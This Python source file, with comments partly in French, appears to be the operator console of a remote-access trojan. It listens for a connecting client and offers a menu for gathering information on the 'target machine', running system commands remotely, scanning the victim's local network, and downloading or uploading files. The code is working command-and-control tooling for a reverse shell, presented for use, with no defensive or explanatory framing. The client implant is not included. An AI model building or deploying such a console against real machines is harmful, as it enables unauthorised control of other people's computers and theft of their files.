# ce code on exécuté dans la machine de administrateur
import socket
import json


class Server:
    def __init__(self,ip,port):
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        server.bind((ip,port))
        server.listen()
        print("[+] waiting for incoming connectins")
        self.connection,self.address = server.accept()
        print("[+] we have a connection from "+ str(self.address))



    def command(self,command):
        self.send_to_client(command)
        return self.receive_from_client()

    def menu(self):
        print("---------------------------------------------------------------")
        print("what you want to do?")
        print("1)- pc client information.")
        print("2)- Execution of system commands.")
        print("3)- Give the ip and mac addresses of the machines on the same network of the client.")
        print("4)- Download a client file.")
        print("5)- upload a file to a client pc.")
        print("6)- Close connection with the client.")
        print("Give your choice from 1 to 6.")
        print("Note: To exit from executing system commands, write exit")
        print("---------------------------------------------------------------")

   

    def send_to_client(self,message):
        message_json = json.dumps(message)
        self.connection.send(bytes(message_json,"utf-8")) 

    def receive_from_client(self):
        message = ""
        while True:
            try:
                message = message + self.connection.recv(1024).decode("utf-8")
                return json.loads(message)
            except ValueError:
                continue
    
    def write_file(self,dstpath,content):
        if content != "error":
            with open(dstpath,"w") as file:
                file.write(content)
                return "[+] download successful."
        return "error execution."

    def read_file(self,path):
        with open(path,"r") as file:
            return file.read()  


    
    def start(self):
        while True:
            self.menu()
            choix = input("#")
            self.send_to_client(choix)
            if choix == "1":
                information = self.receive_from_client()
                print("******************************************************")
                print("\t\t[TARGET MACHINE INFO]")
                print("information for this pc: ")
                print(information)
                print("******************************************************")
            elif choix == "2":
                print("******************************************************")
                print("\t\t[EXECUTE SYSTEME COMMAND]")
                while True:
                    command = input(">>")
                    command = command.split(" ")
                    if command[0].lower() != "exit":
                        output = self.command(command)
                        print(output)
                    else:
                        self.send_to_client(command)
                        print("******************************************************")
                        break
            elif choix == "3":
                print("******************************************************")
                print("[DONNER les adresses ip et mac des machines de meme réseau du client]")                
                mask = input("give me subnet mask of target network:")
                ip = self.address[0] + "/" + mask
                self.send_to_client(str(ip))
                output = self.receive_from_client()
                print(output)
                print("******************************************************")
            elif choix == "4":
                print('*************************************************************')
                print('\t\t\t[GET A FILE]')
                path = input("give me path of the file in target machine : ")
                dst_path = input("give me the destination path in your machine: ")
                self.send_to_client(path)
                content_of_file = self.receive_from_client()
                output = self.write_file(dst_path,content_of_file)
                print(output)
                print('*************************************************************')
            elif choix == "5":
                print('*************************************************************')
                print('\t\t\t[PUT A FILE]')
                path = input("give me path of the file in your machine : ")
                dst_path = input("give me the destination path in target machine: ")
                try:
                    self.send_to_client(dst_path)
                    content_of_file = self.read_file(path)
                    self.send_to_client(content_of_file)
                    output = self.receive_from_client()
                    print(output)
                except:
                    self.send_to_client("error")
                    output = self.receive_from_client()
                    print(output)
                print('*************************************************************')
            elif choix == "6":
                self.connection.close()
                exit()
                

    
        
        



            
            
            
